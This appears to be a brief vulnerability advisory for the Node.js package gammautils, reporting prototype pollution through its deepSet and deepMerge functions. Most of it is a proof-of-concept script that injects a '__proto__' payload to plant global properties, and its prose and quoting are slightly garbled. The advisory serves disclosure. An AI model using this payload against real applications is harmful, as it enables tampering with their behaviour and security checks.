# Overview

`gammautils` is a Lots of utilities for Node.js, this package is vulnerable to Prototype Pollution via the. `deepSet` and `deepMerge` functions.

# Proof of Concept
```
const gammautils = require('gammautils');
var payload = JSON.parse('{""__proto__"":{""polluted"":true}}');
gammautils.object.deepSet({}, '__proto__.polluted2', true);
gammautils.object.deepMerge({}, payload);
console.log(polluted);
console.log(polluted2);
```